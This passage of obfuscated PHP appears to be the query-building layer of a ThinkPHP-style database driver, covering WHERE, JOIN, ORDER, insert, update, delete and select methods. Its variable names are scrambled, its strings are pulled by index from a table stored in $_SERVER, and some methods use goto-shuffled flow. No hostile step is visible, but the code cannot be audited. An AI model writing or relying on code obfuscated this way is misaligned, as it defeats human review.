($cÚ∆¿¢ÇãÔ as $A√Ò·ñ‘‡ñ => $a£É˘≤âé™) { if (!is_numeric($A√Ò·ñ‘‡ñ)) { $Bﬁ†ò¬å‚’[] = $this->parseKey($A√Ò·ñ‘‡ñ, !1) . $d°È…ëÎ¢ä[965] . $this->parseKey($a£É˘≤âé™); } else { $Bﬁ†ò¬å‚’[] = $this->parseKey($a£É˘≤âé™); } } $f“É∫à¢ÍÃ = implode($d°È…ëÎ¢ä[47], $Bﬁ†ò¬å‚’); } elseif (is_string($cÚ∆¿¢ÇãÔ) && !empty($cÚ∆¿¢ÇãÔ)) { $f“É∫à¢ÍÃ = $cÚ∆¿¢ÇãÔ; } else { $f“É∫à¢ÍÃ = $d°È…ëÎ¢ä[182]; } return $f“É∫à¢ÍÃ; } protected function parseTable($cÀŸΩ≥Ñœ∂) { $fœåî¥±⁄≠ =& $_SERVER[™⁄»üÆ]; if (is_array($cÀŸΩ≥Ñœ∂)) { $Eù≈ëÖá„Õ = array(); foreach ($cÀŸΩ≥Ñœ∂ as $dœ…Œäá›¨ => $Dºæ’ìÎú†) { if (!is_numeric($dœ…Œäá›¨)) { $Eù≈ëÖá„Õ[] = $this->parseKey($dœ…Œäá›¨) . $fœåî¥±⁄≠[50] . $this->parseKey($Dºæ’ìÎú†); } else { $Eù≈ëÖá„Õ[] = $this->parseKey($dœ…Œäá›¨); } } $cÀŸΩ≥Ñœ∂ = $Eù≈ëÖá„Õ; } elseif (is_string($cÀŸΩ≥Ñœ∂)) { if (strstr($cÀŸΩ≥Ñœ∂, $fœåî¥±⁄≠[50])) { return $cÀŸΩ≥Ñœ∂; } $cÀŸΩ≥Ñœ∂ = explode($fœåî¥±⁄≠[47], $cÀŸΩ≥Ñœ∂); array_walk($cÀŸΩ≥Ñœ∂, array($this, $fœåî¥±⁄≠[876])); } return $fœåî¥±⁄≠[870] . trim(implode($fœåî¥±⁄≠[966], $cÀŸΩ≥Ñœ∂), $fœåî¥±⁄≠[382]) . $fœåî¥±⁄≠[870]; } protected function parseWhere($f…“¯”‘ µ) { $DÌ°…êµÃ¥ =& $_SERVER[™⁄»üÆ]; $Dí≠ÈîÛ›¶ = $DÌ°…êµÃ¥[33]; if (is_string($f…“¯”‘ µ)) { $Dí≠ÈîÛ›¶ = $f…“¯”‘ µ; } else { $BåøØΩ˜Ç’ = isset($f…“¯”‘ µ[$DÌ°…êµÃ¥[967]]) ? strtoupper($f…“¯”‘ µ[$DÌ°…êµÃ¥[967]]) : $DÌ°…êµÃ¥[33]; if (in_array($BåøØΩ˜Ç’, array($DÌ°…êµÃ¥[968], $DÌ°…êµÃ¥[969], $DÌ°…êµÃ¥[970]))) { $BåøØΩ˜Ç’ = $DÌ°…êµÃ¥[50] . $BåøØΩ˜Ç’ . $DÌ°…êµÃ¥[50]; unset($f…“¯”‘ µ[$DÌ°…êµÃ¥[967]]); } else { $BåøØΩ˜Ç’ = $DÌ°…êµÃ¥[971]; } foreach ($f…“¯”‘ µ as $BÛú›”ÜÉ∞ => $dí±´êÎúï) { $Dí≠ÈîÛ›¶ .= $DÌ°…êµÃ¥[275]; if (is_numeric($BÛú›”ÜÉ∞)) { $BÛú›”ÜÉ∞ = $DÌ°…êµÃ¥[972]; } if (0 === strpos($BÛú›”ÜÉ∞, $DÌ°…êµÃ¥[71])) { $Dí≠ÈîÛ›¶ .= $this->parseThinkWhere($BÛú›”ÜÉ∞, $dí±´êÎúï); } else { if (!preg_match($DÌ°…êµÃ¥[973], trim($BÛú›”ÜÉ∞))) { think_exception(think_lang($DÌ°…êµÃ¥[974]) . $DÌ°…êµÃ¥[4] . $BÛú›”ÜÉ∞); } $C…∑ÓıÏòÁ = is_array($dí±´êÎúï) && isset($dí±´êÎúï[$DÌ°…êµÃ¥[975]]); $BÛú›”ÜÉ∞ = trim($BÛú›”ÜÉ∞); if (strpos($BÛú›”ÜÉ∞, $DÌ°…êµÃ¥[281])) { $FßΩóø®Ô = explode($DÌ°…êµÃ¥[281], $BÛú›”ÜÉ∞); $bëÖﬁÀ¥≈‰ = array(); foreach ($FßΩóø®Ô as $c≈«†©Ì‰î => $f‡õ≥ç€Ò€) { $bµ…ÍêµË˜ = $C…∑ÓıÏòÁ ? $dí±´êÎúï[$c≈«†©Ì‰î] : $dí±´êÎúï; $bëÖﬁÀ¥≈‰[] = $DÌ°…êµÃ¥[258] . $this->parseWhereItem($this->parseKey($f‡õ≥ç€Ò€), $bµ…ÍêµË˜) . $DÌ°…êµÃ¥[875]; } $Dí≠ÈîÛ›¶ .= implode($DÌ°…êµÃ¥[976], $bëÖﬁÀ¥≈‰); } elseif (strpos($BÛú›”ÜÉ∞, $DÌ°…êµÃ¥[282])) { $FßΩóø®Ô = explode($DÌ°…êµÃ¥[282], $BÛú›”ÜÉ∞); $bëÖﬁÀ¥≈‰ = array(); foreach ($FßΩóø®Ô as $c≈«†©Ì‰î => $f‡õ≥ç€Ò€) { $bµ…ÍêµË˜ = $C…∑ÓıÏòÁ ? $dí±´êÎúï[$c≈«†©Ì‰î] : $dí±´êÎúï; $bëÖﬁÀ¥≈‰[] = $DÌ°…êµÃ¥[258] . $this->parseWhereItem($this->parseKey($f‡õ≥ç€Ò€), $bµ…ÍêµË˜) . $DÌ°…êµÃ¥[875]; } $Dí≠ÈîÛ›¶ .= implode($DÌ°…êµÃ¥[971], $bëÖﬁÀ¥≈‰); } else { $Dí≠ÈîÛ›¶ .= $this->parseWhereItem($this->parseKey($BÛú›”ÜÉ∞), $dí±´êÎúï); } } $Dí≠ÈîÛ›¶ .= $DÌ°…êµÃ¥[276] . $BåøØΩ˜Ç’; } $Dí≠ÈîÛ›¶ = substr($Dí≠ÈîÛ›¶, 0, -strlen($BåøØΩ˜Ç’)); } return empty($Dí≠ÈîÛ›¶) ? $DÌ°…êµÃ¥[33] : $DÌ°…êµÃ¥[977] . $Dí≠ÈîÛ›¶; } protected function parseWhereItem($FΩ÷ƒ ´åø, $FÊˆº—µà∞) { $e∏´ÔíﬁïÎ =& $_SERVER[™⁄»üÆ]; $BÏ∆£ñÔàŒ = $e∏´ÔíﬁïÎ[33]; if (is_array($FÊˆº—µà∞)) { if (is_string($FÊˆº—µà∞[0])) { $cèã’âÓõ∫ = strtolower($FÊˆº—µà∞[0]); if (in_array($FÊˆº—µà∞[0], array($e∏´ÔíﬁïÎ[961], $e∏´ÔíﬁïÎ[978], $e∏´ÔíﬁïÎ[979], $e∏´ÔíﬁïÎ[980], $e∏´ÔíﬁïÎ[981], $e∏´ÔíﬁïÎ[982]))) { $BÏ∆£ñÔàŒ .= $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $FÊˆº—µà∞[0] . $e∏´ÔíﬁïÎ[50] . $this->parseValue($FÊˆº—µà∞[1]); } elseif (preg_match($e∏´ÔíﬁïÎ[983], $FÊˆº—µà∞[0])) { $BÏ∆£ñÔàŒ .= $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $this->exp[$cèã’âÓõ∫] . $e∏´ÔíﬁïÎ[50] . $this->parseValue($FÊˆº—µà∞[1]); } elseif (preg_match($e∏´ÔíﬁïÎ[984], $FÊˆº—µà∞[0])) { if (is_array($FÊˆº—µà∞[1])) { $b£π„¶»ÌÊ = isset($FÊˆº—µà∞[2]) ? strtoupper($FÊˆº—µà∞[2]) : $e∏´ÔíﬁïÎ[969]; if (in_array($b£π„¶»ÌÊ, array($e∏´ÔíﬁïÎ[968], $e∏´ÔíﬁïÎ[969], $e∏´ÔíﬁïÎ[970]))) { $A„®Ü¶Æı« = array(); foreach ($FÊˆº—µà∞[1] as $C‰‘ô©àéÂ) { $A„®Ü¶Æı«[] = $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $this->exp[$cèã’âÓõ∫] . $e∏´ÔíﬁïÎ[50] . $this->parseValue($C‰‘ô©àéÂ); } $BÏ∆£ñÔàŒ .= $e∏´ÔíﬁïÎ[258] . implode($e∏´ÔíﬁïÎ[50] . $b£π„¶»ÌÊ . $e∏´ÔíﬁïÎ[50], $A„®Ü¶Æı«) . $e∏´ÔíﬁïÎ[875]; } } else { $BÏ∆£ñÔàŒ .= $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $this->exp[$cèã’âÓõ∫] . $e∏´ÔíﬁïÎ[50] . $this->parseValue($FÊˆº—µà∞[1]); } } elseif ($e∏´ÔíﬁïÎ[295] == $cèã’âÓõ∫) { $BÏ∆£ñÔàŒ .= $e∏´ÔíﬁïÎ[873] . $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $FÊˆº—µà∞[1] . $e∏´ÔíﬁïÎ[985]; } elseif (preg_match($e∏´ÔíﬁïÎ[986], $FÊˆº—µà∞[0])) { $BÏ∆£ñÔàŒ .= $FÊˆº—µà∞[0]; } elseif (preg_match($e∏´ÔíﬁïÎ[987], $FÊˆº—µà∞[0])) { if (isset($FÊˆº—µà∞[2]) && $e∏´ÔíﬁïÎ[295] == $FÊˆº—µà∞[2]) { $BÏ∆£ñÔàŒ .= $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $this->exp[$cèã’âÓõ∫] . $e∏´ÔíﬁïÎ[50] . $FÊˆº—µà∞[1]; } else { if (is_string($FÊˆº—µà∞[1])) { $FÊˆº—µà∞[1] = explode($e∏´ÔíﬁïÎ[47], $FÊˆº—µà∞[1]); } $BﬁÇû≈Ô£Õ = implode($e∏´ÔíﬁïÎ[47], $this->parseValue($FÊˆº—µà∞[1])); $BÏ∆£ñÔàŒ .= $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $this->exp[$cèã’âÓõ∫] . $e∏´ÔíﬁïÎ[873] . $BﬁÇû≈Ô£Õ . $e∏´ÔíﬁïÎ[875]; } } elseif (preg_match($e∏´ÔíﬁïÎ[988], $FÊˆº—µà∞[0])) { $e∏º°€ùõì = is_string($FÊˆº—µà∞[1]) ? explode($e∏´ÔíﬁïÎ[47], $FÊˆº—µà∞[1]) : $FÊˆº—µà∞[1]; $BÏ∆£ñÔàŒ .= $e∏´ÔíﬁïÎ[873] . $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $this->exp[$cèã’âÓõ∫] . $e∏´ÔíﬁïÎ[50] . $this->parseValue($e∏º°€ùõì[0]) . $e∏´ÔíﬁïÎ[971] . $this->parseValue($e∏º°€ùõì[1]) . $e∏´ÔíﬁïÎ[276]; } else { think_exception(think_lang($e∏´ÔíﬁïÎ[974]) . $e∏´ÔíﬁïÎ[4] . $FÊˆº—µà∞[0]); } } else { $BöÁ´≈éÇ‚ = count($FÊˆº—µà∞); $B¬æµ´”ÂÕ = $e∏´ÔíﬁïÎ[33]; if (is_string($FÊˆº—µà∞[$BöÁ´≈éÇ‚ - 1])) { $B¬æµ´”ÂÕ = isset($FÊˆº—µà∞[$BöÁ´≈éÇ‚ - 1]) ? strtoupper($FÊˆº—µà∞[$BöÁ´≈éÇ‚ - 1]) : $e∏´ÔíﬁïÎ[33]; if (in_array($B¬æµ´”ÂÕ, array($e∏´ÔíﬁïÎ[968], $e∏´ÔíﬁïÎ[969], $e∏´ÔíﬁïÎ[970]))) { $BöÁ´≈éÇ‚ = $BöÁ´≈éÇ‚ - 1; } } else { $B¬æµ´”ÂÕ = $e∏´ÔíﬁïÎ[968]; } for ($aßÿ€∆ìÒê = 0; $aßÿ€∆ìÒê < $BöÁ´≈éÇ‚; $aßÿ€∆ìÒê++) { $e∏º°€ùõì = is_array($FÊˆº—µà∞[$aßÿ€∆ìÒê]) ? $FÊˆº—µà∞[$aßÿ€∆ìÒê][1] : $FÊˆº—µà∞[$aßÿ€∆ìÒê]; if ($e∏´ÔíﬁïÎ[295] == strtolower($FÊˆº—µà∞[$aßÿ€∆ìÒê][0])) { $BÏ∆£ñÔàŒ .= $e∏´ÔíﬁïÎ[258] . $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $e∏º°€ùõì . $e∏´ÔíﬁïÎ[985] . $B¬æµ´”ÂÕ . $e∏´ÔíﬁïÎ[50]; } else { $dâüÂØÚû = is_array($FÊˆº—µà∞[$aßÿ€∆ìÒê]) ? $this->exp[strtolower($FÊˆº—µà∞[$aßÿ€∆ìÒê][0])] : $e∏´ÔíﬁïÎ[961]; if (!$dâüÂØÚû && is_array($FÊˆº—µà∞[$aßÿ€∆ìÒê]) && in_array($FÊˆº—µà∞[$aßÿ€∆ìÒê][0], array($e∏´ÔíﬁïÎ[961], $e∏´ÔíﬁïÎ[978], $e∏´ÔíﬁïÎ[979], $e∏´ÔíﬁïÎ[980], $e∏´ÔíﬁïÎ[981], $e∏´ÔíﬁïÎ[982]))) { $dâüÂØÚû = $FÊˆº—µà∞[$aßÿ€∆ìÒê][0]; } $BÏ∆£ñÔàŒ .= $e∏´ÔíﬁïÎ[258] . $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[50] . $dâüÂØÚû . $e∏´ÔíﬁïÎ[50] . $this->parseValue($e∏º°€ùõì) . $e∏´ÔíﬁïÎ[985] . $B¬æµ´”ÂÕ . $e∏´ÔíﬁïÎ[50]; } } $BÏ∆£ñÔàŒ = substr($BÏ∆£ñÔàŒ, 0, -4); } } else { $BÏ∆£ñÔàŒ .= $FΩ÷ƒ ´åø . $e∏´ÔíﬁïÎ[989] . $this->parseValue($FÊˆº—µà∞); } return $BÏ∆£ñÔàŒ; } protected function parseThinkWhere($cƒº≤Ô°È¬, $bØˆß⁄¬∑å) { $FÌÁíŸ«ƒå =& $_SERVER[™⁄»üÆ]; $cœŒ‡¢õÇ‚ = $FÌÁíŸ«ƒå[33]; switch ($cƒº≤Ô°È¬) { case $FÌÁíŸ«ƒå[350]: $cœŒ‡¢õÇ‚ = $bØˆß⁄¬∑å; break; case $FÌÁíŸ«ƒå[972]: $cœŒ‡¢õÇ‚ = is_string($bØˆß⁄¬∑å) ? $bØˆß⁄¬∑å : substr($this->parseWhere($bØˆß⁄¬∑å), 6); break; case $FÌÁíŸ«ƒå[990]: parse_str($bØˆß⁄¬∑å, $A¥‡ì–áÖú); if (isset($A¥‡ì–áÖú[$FÌÁíŸ«ƒå[967]])) { $EëıËÃ‘©Ë = $FÌÁíŸ«ƒå[50] . strtoupper($A¥‡ì–áÖú[$FÌÁíŸ«ƒå[967]]) . $FÌÁíŸ«ƒå[50]; unset($A¥‡ì–áÖú[$FÌÁíŸ«ƒå[967]]); } else { $EëıËÃ‘©Ë = $FÌÁíŸ«ƒå[971]; } $aˆ™»èÓàé = array(); foreach ($A¥‡ì–áÖú as $aåÆÍÚó‘® => $EÿÓ’ÓÇ Â) { $aˆ™»èÓàé[] = $this->parseKey($aåÆÍÚó‘®) . $FÌÁíŸ«ƒå[989] . $this->parseValue($EÿÓ’ÓÇ Â); } $cœŒ‡¢õÇ‚ = implode($EëıËÃ‘©Ë, $aˆ™»èÓàé); break; } return $cœŒ‡¢õÇ‚; } protected function parseLimit($AÂ√Ò»∆—Ñ) { $Càè—è¿äË =& $_SERVER[™⁄»üÆ]; return !empty($AÂ√Ò»∆—Ñ) ? $Càè—è¿äË[48] . $AÂ√Ò»∆—Ñ . $Càè—è¿äË[50] : $Càè—è¿äË[33]; } protected function parseJoin($f·é˘ê˜àÃ) { $fı⁄ë¨·º◊ =& $_SERVER[™⁄»üÆ]; $DªÍã∑Ê©ç = $fı⁄ë¨·º◊[33]; if (!empty($f·é˘ê˜àÃ)) { if (is_array($f·é˘ê˜àÃ)) { foreach ($f·é˘ê˜àÃ as $CÀ•†Üé¶≤ => $D‰ü¬˘èè») { if (!1 !== stripos($D‰ü¬˘èè», $fı⁄ë¨·º◊[991])) { $DªÍã∑Ê©ç .= $fı⁄ë¨·º◊[50] . $D‰ü¬˘èè»; } else { $DªÍã∑Ê©ç .= $fı⁄ë¨·º◊[992] . $D‰ü¬˘èè»; } } } else { $DªÍã∑Ê©ç .= $fı⁄ë¨·º◊[992] . $f·é˘ê˜àÃ; } } $DªÍã∑Ê©ç = preg_replace($fı⁄ë¨·º◊[993], think_config($fı⁄ë¨·º◊[899]) . $fı⁄ë¨·º◊[994], $DªÍã∑Ê©ç); return $DªÍã∑Ê©ç; } protected function parseOrder($a¡À––Ÿ§Ï) { $a¶ú ı£çÉ =& $_SERVER[™⁄»üÆ]; if (is_array($a¡À––Ÿ§Ï)) { $Fì¿Ú»»— = array(); foreach ($a¡À––Ÿ§Ï as $aù‚âÔñ¶‰ => $f„Üàüè—ê) { if (is_numeric($aù‚âÔñ¶‰)) { $Fì¿Ú»»—[] = $this->parseKey($f„Üàüè—ê); } else { $f„Üàüè—ê = in_array(strtoupper(trim($f„Üàüè—ê)), array($a¶ú ı£çÉ[995], $a¶ú ı£çÉ[996])) ? $a¶ú ı£çÉ[50] . $f„Üàüè—ê : $a¶ú ı£çÉ[33]; if (preg_match($a¶ú ı£çÉ[997], $aù‚âÔñ¶‰)) { $Fì¿Ú»»—[] = $this->parseKey($aù‚âÔñ¶‰) . $f„Üàüè—ê; } else { think_exception($a¶ú ı£çÉ[998] . $aù‚âÔñ¶‰); } } } $a¡À––Ÿ§Ï = implode($a¶ú ı£çÉ[47], $Fì¿Ú»»—); } return !empty($a¡À––Ÿ§Ï) ? $a¶ú ı£çÉ[999] . $a¡À––Ÿ§Ï : $a¶ú ı£çÉ[33]; } protected function parseGroup($C±âÛÉ“πˆ) { $f≤∑Ö’£‰‰ =& $_SERVER[™⁄»üÆ]; return !empty($C±âÛÉ“πˆ) ? $f≤∑Ö’£‰‰[1000] . $C±âÛÉ“πˆ : $f≤∑Ö’£‰‰[33]; } protected function parseHaving($EÈõ◊Û€¡ò) { $Dåû√√˜∫Â =& $_SERVER[™⁄»üÆ]; return !empty($EÈõ◊Û€¡ò) ? $Dåû√√˜∫Â[1001] . $EÈõ◊Û€¡ò : $Dåû√√˜∫Â[33]; } protected function parseComment($cÏ⁄∞ﬁÃô¯) { $AÕªûÿœÇ· =& $_SERVER[™⁄»üÆ]; return !empty($cÏ⁄∞ﬁÃô¯) ? $AÕªûÿœÇ·[1002] . $cÏ⁄∞ﬁÃô¯ . $AÕªûÿœÇ·[1003] : $AÕªûÿœÇ·[33]; } protected function parseDistinct($D“ÛéÀ˜¥Á) { $dã∏›»™°Õ =& $_SERVER[™⁄»üÆ]; return !empty($D“ÛéÀ˜¥Á) ? $dã∏›»™°Õ[1004] : $dã∏›»™°Õ[33]; } protected function parseUnion($Dπ∆âãâ◊Ø) { $få¶¶ˆ›“ú =& $_SERVER[™⁄»üÆ]; if (empty($Dπ∆âãâ◊Ø)) { return $få¶¶ˆ›“ú[33]; } if (isset($Dπ∆âãâ◊Ø[$få¶¶ˆ›“ú[346]])) { $BÉñ…àëÔê = $få¶¶ˆ›“ú[1005]; unset($Dπ∆âãâ◊Ø[$få¶¶ˆ›“ú[346]]); } else { $BÉñ…àëÔê = $få¶¶ˆ›“ú[1006]; } foreach ($Dπ∆âãâ◊Ø as $bœΩ›≠ÎÀˆ) { $Aõä¥ôº¿ñ[] = $BÉñ…àëÔê . (is_array($bœΩ›≠ÎÀˆ) ? $this->buildSelectSql($bœΩ›≠ÎÀˆ) : $bœΩ›≠ÎÀˆ); } return implode($få¶¶ˆ›“ú[50], $Aõä¥ôº¿ñ); } public function insert($aË§ØãÎ™ö, $fﬁ¶Ëò∏∆â = array(), $E¿øïÂÑ√√ = false) { goto DıÃçóÜ≥’; CìÉÆç„≤è: $bºöˆ´éÎù .= $this->parseComment(!empty($fﬁ¶Ëò∏∆â[$eåŸÍ±Ñß«[352]]) ? $fﬁ¶Ëò∏∆â[$eåŸÍ±Ñß«[352]] : $eåŸÍ±Ñß«[33]); return $this->execute($bºöˆ´éÎù, $this->parseBind(!empty($fﬁ¶Ëò∏∆â[$eåŸÍ±Ñß«[283]]) ? $fﬁ¶Ëò∏∆â[$eåŸÍ±Ñß«[283]] : array())); goto aÇ»∆ÉÇ§∏; e‘åπ∆ÇÛ»: foreach ($aË§ØãÎ™ö as $Cò≥ÑôÌçÚ => $aµÈ£íπ™Ÿ) { if (is_array($aµÈ£íπ™Ÿ) && $eåŸÍ±Ñß«[295] == $aµÈ£íπ™Ÿ[0]) { $c¥ ∞à∫ñÌ[] = $this->parseKey($Cò≥ÑôÌçÚ); $c—à√®ØÁ‘[] = $aµÈ£íπ™Ÿ[1]; } elseif (is_scalar($aµÈ£íπ™Ÿ) || is_null($aµÈ£íπ™Ÿ)) { $c¥ ∞à∫ñÌ[] = $this->parseKey($Cò≥ÑôÌçÚ); $c—à√®ØÁ‘[] = $this->parseValue($aµÈ£íπ™Ÿ); } } $bºöˆ´éÎù = ($E¿øïÂÑ√√ ? $eåŸÍ±Ñß«[877] : $eåŸÍ±Ñß«[878]) . $eåŸÍ±Ñß«[879] . $this->parseTable($fﬁ¶Ëò∏∆â[$eåŸÍ±Ñß«[277]]) . $eåŸÍ±Ñß«[873] . implode($eåŸÍ±Ñß«[47], $c¥ ∞à∫ñÌ) . $eåŸÍ±Ñß«[874] . implode($eåŸÍ±Ñß«[47], $c—à√®ØÁ‘) . $eåŸÍ±Ñß«[875]; $bºöˆ´éÎù .= $this->parseLock(isset($fﬁ¶Ëò∏∆â[$eåŸÍ±Ñß«[832]]) ? $fﬁ¶Ëò∏∆â[$eåŸÍ±Ñß«[832]] : !1); goto CìÉÆç„≤è; DıÃçóÜ≥’: $eåŸÍ±Ñß« =& $_SERVER[™⁄»üÆ]; $c—à√®ØÁ‘ = $c¥ ∞à∫ñÌ = array(); $this->model = $fﬁ¶Ëò∏∆â[$eåŸÍ±Ñß«[279]]; goto e‘åπ∆ÇÛ»; aÇ»∆ÉÇ§∏: } public function selectInsert($e»¢íäÆì∆, $c«∏◊éí∂é, $Aƒ”¯ÖØﬂ˘ = array()) { goto b†ºŸç°®; e´ù–ë∏Èû: return $this->execute($EáÑ¡æë√ß, $this->parseBind(!empty($Aƒ”¯ÖØﬂ˘[$bÌâÃª˜©‹[283]]) ? $Aƒ”¯ÖØﬂ˘[$bÌâÃª˜©‹[283]] : array())); goto eÏ∏∫£Œç÷; aà∆°ùÎ◊›: array_walk($e»¢íäÆì∆, array($this, $bÌâÃª˜©‹[876])); $EáÑ¡æë√ß = $bÌâÃª˜©‹[1007] . $this->parseTable($c«∏◊éí∂é) . $bÌâÃª˜©‹[873] . implode($bÌâÃª˜©‹[47], $e»¢íäÆì∆) . $bÌâÃª˜©‹[985]; $EáÑ¡æë√ß .= $this->buildSelectSql($Aƒ”¯ÖØﬂ˘); goto e´ù–ë∏Èû; b†ºŸç°®: $bÌâÃª˜©‹ =& $_SERVER[™⁄»üÆ]; $this->model = $Aƒ”¯ÖØﬂ˘[$bÌâÃª˜©‹[279]]; if (is_string($e»¢íäÆì∆)) { $e»¢íäÆì∆ = explode($bÌâÃª˜©‹[47], $e»¢íäÆì∆); } goto aà∆°ùÎ◊›; eÏ∏∫£Œç÷: } public function update($Bﬁ€±„ì®∂, $eñÇŸ®¥Óı) { $eù»ßáﬁ◊£ =& $_SERVER[™⁄»üÆ]; $this->model = $eñÇŸ®¥Óı[$eù»ßáﬁ◊£[279]]; $aŒÀŸúú´Œ = $eù»ßáﬁ◊£[1008] . $this->parseTable($eñÇŸ®¥Óı[$eù»ßáﬁ◊£[277]]) . $this->parseSet($Bﬁ€±„ì®∂) . $this->parseWhere(!empty($eñÇŸ®¥Óı[$eù»ßáﬁ◊£[273]]) ? $eñÇŸ®¥Óı[$eù»ßáﬁ◊£[273]] : $eù»ßáﬁ◊£[33]) . $this->parseOrder(!empty($eñÇŸ®¥Óı[$eù»ßáﬁ◊£[363]]) ? $eñÇŸ®¥Óı[$eù»ßáﬁ◊£[363]] : $eù»ßáﬁ◊£[33]) . $this->parseLimit(!empty($eñÇŸ®¥Óı[$eù»ßáﬁ◊£[290]]) ? $eñÇŸ®¥Óı[$eù»ßáﬁ◊£[290]] : $eù»ßáﬁ◊£[33]) . $this->parseLock(isset($eñÇŸ®¥Óı[$eù»ßáﬁ◊£[832]]) ? $eñÇŸ®¥Óı[$eù»ßáﬁ◊£[832]] : !1) . $this->parseComment(!empty($eñÇŸ®¥Óı[$eù»ßáﬁ◊£[352]]) ? $eñÇŸ®¥Óı[$eù»ßáﬁ◊£[352]] : $eù»ßáﬁ◊£[33]); return $this->execute($aŒÀŸúú´Œ, $this->parseBind(!empty($eñÇŸ®¥Óı[$eù»ßáﬁ◊£[283]]) ? $eñÇŸ®¥Óı[$eù»ßáﬁ◊£[283]] : array())); } public function delete($BﬁÌ·≥Œ√ƒ = array()) { $câÙ≠∏ôÑœ =& $_SERVER[™⁄»üÆ]; $this->model = $BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[279]]; $b„°ô‘»∂⁄ = $câÙ≠∏ôÑœ[1009] . $this->parseTable($BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[277]]) . $this->parseWhere(!empty($BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[273]]) ? $BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[273]] : $câÙ≠∏ôÑœ[33]) . $this->parseOrder(!empty($BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[363]]) ? $BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[363]] : $câÙ≠∏ôÑœ[33]) . $this->parseLimit(!empty($BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[290]]) ? $BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[290]] : $câÙ≠∏ôÑœ[33]) . $this->parseLock(isset($BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[832]]) ? $BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[832]] : !1) . $this->parseComment(!empty($BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[352]]) ? $BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[352]] : $câÙ≠∏ôÑœ[33]); return $this->execute($b„°ô‘»∂⁄, $this->parseBind(!empty($BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[283]]) ? $BﬁÌ·≥Œ√ƒ[$câÙ≠∏ôÑœ[283]] : array())); } public function select($D«öó∆ÁçÎ = array()) { goto döáÒ√∆Ïì; F∆Û≤Æ¡◊≈: if ($e≠à‰ê◊óÇ && !1 !== $D√’∞Ãı•») { think_cache($b∫èº‹ËÉ«, $D√’∞Ãı•», $e≠à‰ê◊óÇ); } return $D√’∞Ãı•»; goto e¨·ß„ê≤Ó; cÕÒ‡«∏öÔ: $e≠à‰ê◊óÇ = isset($D«öó∆ÁçÎ[$câÊù«ﬁŸ“[347]]) ? $D«öó∆ÁçÎ[$câÊù«ﬁŸ“[347]] : !1; if ($e≠à‰ê◊óÇ) { $b∫èº‹ËÉ« = is_string($e≠à‰ê◊óÇ[$câÊù«ﬁŸ“[93]]) ? $e≠à‰ê◊óÇ[$câÊù«ﬁŸ“[93]] : $câÊù«ﬁŸ“[1010] . md5($EÇúÒ»©Ûü); $CßÖâ”É·Ú = think_cache($b∫èº‹ËÉ«, $câÊù«ﬁŸ“[33], $e≠à‰ê◊óÇ); if (!1 !== $CßÖâ”É·Ú) { return $CßÖâ”É·Ú; } } $D√’∞Ãı•» = $this->query($EÇúÒ»©Ûü, $this->parseBind(!empty($D«öó∆ÁçÎ[$câÊù«ﬁŸ“[283]]) ? $D«öó∆ÁçÎ[$câÊù«ﬁŸ“[283]] : array())); goto F∆Û≤Æ¡◊≈; döáÒ√∆Ïì: $câÊù«ﬁŸ“ =& $_SERVER[™⁄»üÆ]; $this->model = $D«öó∆ÁçÎ[$câÊù«ﬁŸ“[279]]; $EÇúÒ»©Ûü = $this->buildSelectSql($D«öó∆ÁçÎ); goto cÕÒ‡«∏öÔ; e¨·ß„ê≤Ó: } public function buildSelectSql($C√™ÿ°¯í∂ = array()) { goto EΩñ¥ÍÚƒÁ; Eœ…í”ä≠π: return $FéöÉóçÉè; goto DúÜíî›ÜÙ; EΩñ¥ÍÚƒÁ: $c£Ç≤üÀ”î =& $_SERVER[™⁄»üÆ]; if (isset($C√™ÿ°¯í∂[$c£Ç≤üÀ”î[351]])) { if (strpos($C√™ÿ°¯í∂[$c£Ç≤üÀ”î[351]], $c£Ç≤üÀ”î[47])) { list($B∑ÃÊÍÎó, $cèòÜÜ∫Çø) = explode($c£Ç≤üÀ”î[47], $C√™ÿ°¯í∂[$c£Ç≤üÀ”î[351]]); } else { $B∑ÃÊÍÎó = $C√™ÿ°¯í∂[$c£Ç≤üÀ”î[351]]; } $B∑ÃÊÍÎó = $B∑ÃÊÍÎó ? $B∑ÃÊÍÎó : 1; $cèòÜÜ∫Çø = isset($cèòÜÜ∫Çø) ? $cèòÜÜ∫Çø : (is_numeric($C√™ÿ°¯í∂[$c£Ç≤üÀ”î[290]]) ? $C√™ÿ°¯í∂[$c£Ç≤üÀ”î[290]] : 20); $Eç™°ˆºè’ = $cèòÜÜ∫Çø * ((int) $B∑ÃÊÍÎó - 1); $C√™ÿ°¯í∂[$c£Ç≤üÀ”î[290]] = $Eç™°ˆºè’ . $c£Ç≤üÀ”î[47] . $cèòÜÜ∫Çø; } if (think_config($c£Ç≤üÀ”î[1011])) { $FæÖÎ…óè‰ = $c£Ç≤üÀ”î[1012] . md5(serialize($C√™ÿ°¯í∂)); $fÚ’‹ÜêÃ§ = think_cache($FæÖÎ…óè‰); if ($fÚ’‹ÜêÃ§) { return $fÚ’‹ÜêÃ§; } } goto b±¶àÁõ≠É; b±¶àÁõ≠É: $FéöÉóçÉè = $this->parseSql($this->selectSql, $C√™ÿ°¯í∂); $FéöÉóçÉè .= 